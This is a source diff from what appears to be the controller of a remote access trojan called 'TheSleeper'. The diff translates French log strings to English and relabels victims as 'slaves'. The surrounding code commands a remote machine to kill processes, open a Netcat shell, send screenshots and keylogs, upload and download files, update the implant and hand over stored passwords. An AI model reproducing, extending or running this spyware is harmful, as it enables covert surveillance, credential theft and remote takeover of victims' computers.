@@ -38,7 +38,7 @@ namespace TheSleeper
 
     void Client::disconnect()
     {
-		LOG << "Reset des connexions.";
+		LOG << "Resetting connexions";
 		session.reset();
 		status = tr("Deconnected");
 	}
@@ -59,10 +59,10 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue.";
+            LOG << "Unknown exception";
             emit disconnected();
         }
-		return "Undefined System";
+		return "Undefined OS Version";
     }
 
 	QStandardItemModel& Client::getRemoteFileTree()
@@ -155,7 +155,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue";
+            LOG << "Unknown exception";
             emit disconnected();
         }
     }
@@ -171,7 +171,7 @@ namespace TheSleeper
             session >> buffer;
             if(buffer == FAILURE)
             {
-                LOG << "Impossible de tuer le processus "+process.toStdString();
+                LOG << "Unable to kill process " + process.toStdString();
             }
             else
             {
@@ -185,7 +185,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue";
+            LOG << "Unknown exception";
             emit disconnected();
         }
     }
@@ -198,7 +198,7 @@ namespace TheSleeper
             ifstream netcat(SHELL_PROGRAM, std::ios::binary);
             if(!netcat)
             {
-                LOG << "Impossible de trouver l'executable de Netcat.";
+                LOG << "NetCat program does not exist";
             }
             else
             {
@@ -222,7 +222,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue";
+            LOG << "Unknown exception";
             emit disconnected();
         }
     }
@@ -232,22 +232,22 @@ namespace TheSleeper
         try
         {
             session << GET_SCREEN;
-            LOG << "Qualite du screenshot a recevoir : "+to_string(quality);
+            LOG << "Quality : " + to_string(quality);
             session << to_string(quality);
             string buffer_photo;
             InMemoryDownload download(buffer_photo, session.stream());
             download.addObserver(new GraphicProgressBar(bar));
 			download.launch();
-			LOG << "Taille de la photo : " + to_string(buffer_photo.size());
+			LOG << "Image size : " + to_string(buffer_photo.size());
 			if(screen.loadFromData((const unsigned char *)buffer_photo.c_str(), buffer_photo.size()))
 			{
-				LOG << "Chargement de l'image OK.";
+				LOG << "Loading OK";
 			}
 			else
 			{
-				LOG << "Impossible de charger l'image.";
+				LOG << "Unable to load image";
 			}
-			LOG << "Format de l'image : " + to_string(screen.width()) + "x" + to_string(screen.height());
+			LOG << "Image format : " + to_string(screen.width()) + "x" + to_string(screen.height());
 		}
         catch(FileNotFound& e)
         {
@@ -266,7 +266,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue.";
+            LOG << "Unknown exception";
             emit disconnected();
         }
     }
@@ -283,8 +283,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue.";
-
+            LOG << "Unknown exception";
         }
         emit disconnected();
     }
@@ -301,7 +300,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue.";
+            LOG << "Unknown exception";
         }
     }
 
@@ -317,7 +316,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue.";
+            LOG << "Unknown exception";
         }
         emit disconnected();
     }
@@ -334,7 +333,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue.";
+            LOG << "Unknown exception";
         }
         emit disconnected();
     }
@@ -351,7 +350,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue.";
+            LOG << "Unknown exception";
         }
         emit disconnected();
     }
@@ -368,7 +367,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue.";
+            LOG << "Unknown exception";
         }
         emit disconnected();
     }
@@ -387,12 +386,12 @@ namespace TheSleeper
                 Upload upload(server_filename.toStdString(), session.stream());
                 upload.launch();
                 //reboot();
-                QMessageBox::information(0, tr("Mise a jour"), tr("Le client a ete mis a jour. Redemarrer le client pour prendre en compte les modifications."));
+                QMessageBox::information(0, tr("Update"), tr("Slave was updated. Reboot slave for modifications to take effect"));
             }
             else
             {
-                LOG << "Impossible de mettre a jour le client.";
-                QMessageBox::critical(0, tr("Probleme"), tr("Impossible de mettre a jour le client"));
+                LOG << "Unable to update slave";
+                QMessageBox::critical(0, tr("Problem"), tr("Unable to update slave"));
             }
         }
         catch(exception& e)
@@ -402,7 +401,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue.";
+            LOG << "Unknown exception";
             emit disconnected();
         }
     }
@@ -415,7 +414,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue.";
+            LOG << "Unknown exception";
         }
         emit disconnected();
     }
@@ -431,7 +430,7 @@ namespace TheSleeper
             session >> answer;
             if(answer == KEYLOG_EMPTY)
             {
-                current_keylog = "Fichier log vide.";
+                current_keylog = "Log file empty";
                 return;
             }
             
@@ -444,15 +443,15 @@ namespace TheSleeper
         }
         catch(RemoteFileNotFound&)
         {
-            LOG << "Impossible de trouver le fichier distant.";
+            LOG << "Unable to find remote file";
         }
         catch(LocalFileNotFound&)
         {
-            LOG << "Impossible d'écrire dans le fichier local.";
+            LOG << "Can't write local file";
         }
         catch(FileNotFound&)
         {
-            LOG << "Fichier introuvable.";
+            LOG << "File does not exist";
         }
         catch(exception& e)
         {
@@ -461,7 +460,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue.";
+            LOG << "Unknown exception";
             emit disconnected();
         }
     }
@@ -470,7 +469,7 @@ namespace TheSleeper
     {
         try
         {
-            LOG << "Mise a jour des lecteurs racines.";
+            LOG << "Updating root drives started";
             remote_files.clear();
             
             session << BROWSE_FILES;
@@ -489,7 +488,7 @@ namespace TheSleeper
                 item->setIcon(iprov.icon(QFileIconProvider::Drive));
                 remote_files.appendRow(item);
             }
-            LOG << "Fin de mise a jour des lecteurs racines.";
+            LOG << "Updating root drives ended";
         }
         catch(exception& e)
         {
@@ -498,7 +497,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            QMessageBox::information(0, "TheSleeper",tr("Erreur d'origine inconnue."));
+            QMessageBox::information(0, "TheSleeper",tr("Unknown error"));
         }
 		return remote_files;
     }
@@ -514,19 +513,19 @@ namespace TheSleeper
             // si c'est un fichier qui a été selectionné, ne rien faire
             if(file[file.size()-1] != '\\')
             {
-                LOG << "Ce n'est pas un dossier qui a ete selectionne.";
+                LOG << "Directory is not selected";
                 return true;
             }
             
             // c'est un dossier mais a-t-il déja été listé ?
             if(remote_files.hasChildren(current_index))
             {
-                LOG << "Le dossier selectionne a deja ete liste.";
+                LOG << "Directory is already lin list";
                 return true;
             }
             
             QString path = getRemotePath(current_index);
-            LOG << "Dossier a lister : " + path.toStdString();
+            LOG << "Directory to list : " + path.toStdString();
             
             session << BROWSE_FILES;
             session << path.toStdString();
@@ -540,7 +539,7 @@ namespace TheSleeper
                 session >> listing;
                 if(listing == FAILURE)
                 {
-                    LOG << "Impossible de lister ce repertoire.";
+                    LOG << "Unable to list the directory";
                     return false;
                 }
                 if(listing == FINISHED)
@@ -571,7 +570,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue.";
+            LOG << "Unkown exception";
             emit disconnected();
         }
 		return true;
@@ -593,7 +592,7 @@ namespace TheSleeper
     {
         try
         {
-            LOG << "Source : " + source.toStdString() + "  et destination : " + destination.toStdString();
+            LOG << "Source : " + source.toStdString() + " , destination : " + destination.toStdString();
             session << START_DOWNLOAD;
             session << source.toStdString();
             Download transfer(destination.toStdString(), session.stream());
@@ -602,7 +601,7 @@ namespace TheSleeper
         }
         catch(Blaspheme::FileNotFound&)
         {
-            LOG << "Impossible de creer le fichier de destination : "+destination.toStdString();
+            LOG << "Unable to create destination file : "+destination.toStdString();
             emit disconnected();
         }
         catch(exception& e)
@@ -612,7 +611,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue.";
+            LOG << "Unkown exception";
             emit disconnected();
         }
     }
@@ -621,7 +620,7 @@ namespace TheSleeper
     {
         try
         {
-            LOG << "Source : "+source.toStdString()+ "  et destination : " + destination.toStdString();
+            LOG << "Source : "+source.toStdString()+ " , destination : " + destination.toStdString();
             session << START_UPLOAD;
 			session << destination.toStdString();
             
@@ -631,7 +630,7 @@ namespace TheSleeper
 		}
         catch(Blaspheme::FileNotFound&)
         {
-            LOG << "Impossible de creer le fichier de destination : "+destination.toStdString();
+            LOG << "Unable to create destination file : " + destination.toStdString();
         }
         catch(exception& e)
         {
@@ -640,7 +639,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue.";
+            LOG << "Unknown exception";
             emit disconnected();
         }
     }
@@ -651,36 +650,35 @@ namespace TheSleeper
 		string buffer;
 		session >> buffer;
 		system_version = buffer.c_str();
-		LOG << "Version du systeme d'exploitation : " + buffer;
+		LOG << "Operating System version : " + buffer;
 	}
 
 	void Client::updateClientName()
 	{
 		session << GET_CLIENT_NAME;        
-		LOG << "Attente du nom du client...";
+		LOG << "Waiting for slave name";
 		string buffer;
 		session >> buffer;
 		name = buffer.c_str();
-		LOG << "Nom du client : " + buffer;
+		LOG << "Slave name : " + buffer;
 	}
 
 	void Client::updatePasswords()
 	{
 		session << PASSWORDS_GETALL;
-		LOG << "Attente des mots de passe du client...";
+		LOG << "Waiting for passwords";
 		string buffer;
 		session >> buffer;
 		if(buffer == FINISHED)
 		{
 			return;
 		}
-		LOG << "Mots de passes recuperes : " + buffer;
+		LOG << "Passwords : " + buffer;
 		// on decoupe la chaine a l'aide du delimiteur
 		std::istringstream iss(buffer);
 		string cred;
 		while ( std::getline( iss, cred, ',' ) )
 		{
-			LOG << "Ajout du mot de passe : " + cred;
 			stored_passwords << cred.c_str();
 		}		
 	}
